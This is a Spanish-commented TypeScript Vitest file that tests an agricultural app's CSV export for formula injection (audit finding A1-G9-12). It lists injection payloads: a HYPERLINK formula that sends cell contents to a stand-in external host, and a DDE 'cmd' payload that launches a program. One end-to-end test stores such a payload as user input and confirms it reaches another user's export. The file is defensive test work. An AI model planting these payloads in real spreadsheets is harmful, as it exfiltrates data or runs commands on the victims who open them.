/**
 * G9 / T07 — exportación CSV de la comparación EVECL
 * (`frontend/src/features/evecl/exportCsv.ts`, función pura).
 *
 * Los textos que llegan al CSV (`grupo_label` = variedad + código de parcela)
 * los escribe cualquier usuario autenticado: la variedad es texto libre. Un CSV
 * que se abre en Excel o Sheets interpreta como fórmula toda celda que empieza
 * con `=`, `+`, `-` o `@` (también tabulación o retorno de carro).
 *
 * Hallazgo (el `it.fails` está escrito con lo que DEBERÍA pasar):
 *  - A1-G9-12  el CSV no neutraliza fórmulas (inyección de fórmulas / CSV injection)
 */
import { guardarFichaEvecl } from '../envolturas';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { crearCsvComparacion, gruposExportables } from '../../../frontend/src/features/evecl/exportCsv';
import { ContextoG9, type DescriptorG9, type UsuarioG9 } from './g9-setup';

type Comparacion = Parameters<typeof crearCsvComparacion>[0];

function comparacionCon(label: string, extra: Partial<Comparacion['ranking_calidad'][number]> = {}): Comparacion {
  return {
    modo: 'entre_grupos',
    conjunto: 'todos',
    nota_metodologica: 'x',
    ranking_calidad: [{ grupo_key: 'k1', grupo_label: label, variedad: 'v', ensayo_id: 1, tipo: 'evaluacion', puntaje: 80, n_con_dato: 3, n_total: 5, ...extra }],
    ranking_productividad: [],
    perfil_fenologia: [],
    perfil_adaptabilidad: [],
  };
}

/** Analizador CSV mínimo (RFC 4180) para comprobar que la ida y vuelta conserva el texto. */
function parsear(csv: string): string[][] {
  const filas: string[][] = [];
  let fila: string[] = [];
  let celda = '';
  let entreComillas = false;
  for (let i = 0; i < csv.length; i++) {
    const c = csv[i];
    if (entreComillas) {
      if (c === '"' && csv[i + 1] === '"') { celda += '"'; i++; }
      else if (c === '"') entreComillas = false;
      else celda += c;
    } else if (c === '"') entreComillas = true;
    else if (c === ',') { fila.push(celda); celda = ''; }
    else if (c === '\r' && csv[i + 1] === '\n') { fila.push(celda); filas.push(fila); fila = []; celda = ''; i++; }
    else celda += c;
  }
  fila.push(celda);
  filas.push(fila);
  return filas;
}

describe('T07 — exportCsv: escapado (confirmaciones)', () => {
  it('comas, comillas y saltos de línea en un texto sobreviven a la ida y vuelta', () => {
    const textos = ['Duke, tardía', 'Cultivar "Alfa"', 'Línea 1\nLínea 2', 'con\r\nretorno', 'a,"b",\n"c"'];
    for (const t of textos) {
      const filas = parsear(crearCsvComparacion(comparacionCon(t)));
      expect(filas).toHaveLength(2);
      expect(filas[1][5], t).toBe(t);
      expect(filas[1]).toHaveLength(filas[0].length);
    }
  });

  it('el encabezado es estable y los números salen sin formato local', () => {
    const filas = parsear(crearCsvComparacion(comparacionCon('X')));
    expect(filas[0]).toEqual(['modo', 'conjunto', 'eje', 'tipo_resultado', 'grupo_key', 'grupo_label', 'descriptor', 'puntaje', 'nota_moda', 'label_moda', 'divergente', 'n_con_dato', 'n_total']);
    expect(filas[1][7]).toBe('80');
  });

  it('un grupo con puntaje no finito se exporta tal cual llega ("NaN"), sin avisar (consecuencia de A1-G9-08)', () => {
    const filas = parsear(crearCsvComparacion(comparacionCon('X', { puntaje: 'NaN' as unknown as number })));
    expect(filas[1][7]).toBe('NaN');
  });
});

describe('T07 — A1-G9-12: inyección de fórmulas en el CSV', () => {
  const PELIGROSOS = [
    '=HYPERLINK("http://externo.example/?x="&A1,"ver ficha")',
    '=cmd|\' /C calc\'!A0',
    '+SUM(1+1)',
    '-2+3',
    '@SUM(1)',
    '\t=1+1',
    '\r=1+1',
  ];

  it.fails('A1-G9-12 — ninguna celda de texto debería empezar con = + - @ tab o CR (hoy se escribe tal cual y Excel la evalúa)', () => {
    for (const t of PELIGROSOS) {
      const filas = parsear(crearCsvComparacion(comparacionCon(t)));
      const celda = filas[1][5];
      expect(/^[=+\-@\t\r]/.test(celda), JSON.stringify(t)).toBe(false);
    }
  });

  it('una variedad legítima que empieza con letra o dígito no se altera', () => {
    for (const t of ['Duke', '10-A', 'Legacy — P-01']) {
      expect(parsear(crearCsvComparacion(comparacionCon(t)))[1][5]).toBe(t);
    }
  });

  it('gruposExportables conserva etiqueta y clave sin transformar', () => {
    expect(gruposExportables(comparacionCon('=A1'))).toEqual([{ key: 'k1', label: '=A1' }]);
  });
});

describe('T07 — A1-G9-12: de punta a punta, la variedad escrita por un usuario llega al CSV de otro', () => {
  const ctx = new ContextoG9();
  let autor: UsuarioG9;
  let lector: UsuarioG9;
  let cat: DescriptorG9[];

  beforeAll(async () => {
    autor = await ctx.usuario('csv-autor', 'operario');
    lector = await ctx.usuario('csv-admin', 'admin');
    cat = await ctx.catalogo(autor.client);
  }, 60_000);

  afterAll(async () => {
    await ctx.limpiar();
  }, 60_000);

  it('la base acepta una variedad que empieza con "=" y la devuelve en grupo_label; el CSV de quien exporta la contiene sin neutralizar', async () => {
    const ensayoId = await ctx.ensayo(autor.client, 'CSV');
    const firmeza = cat.find((d) => d.codigo_upov === 28)!;
    const variedad = '=HYPERLINK("http://externo.example/?c="&A1,"Duke")';
    const { error } = await guardarFichaEvecl(autor.client, {
      p_ensayo_id: ensayoId, p_variedad: variedad, p_numero_repeticion: 1,
      p_respuestas: [{ descriptor_id: firmeza.id, valor_numerico: 12 }],
    });
    expect(error).toBeNull();

    const { data, error: errCmp } = await lector.client.rpc('evecl_comparar', { p_modo: 'entre_grupos', p_ensayo_id: ensayoId });
    expect(errCmp).toBeNull();
    const csv = crearCsvComparacion(data as Comparacion);
    const celdas = parsear(csv).slice(1).map((f) => f[5]);
    // Verificado: la celda empieza con "=" (peligrosa). Si algún día se neutraliza, esta línea falla y se actualiza junto con A1-G9-12.
    expect(celdas.some((c) => c.startsWith('='))).toBe(true);
  });
});
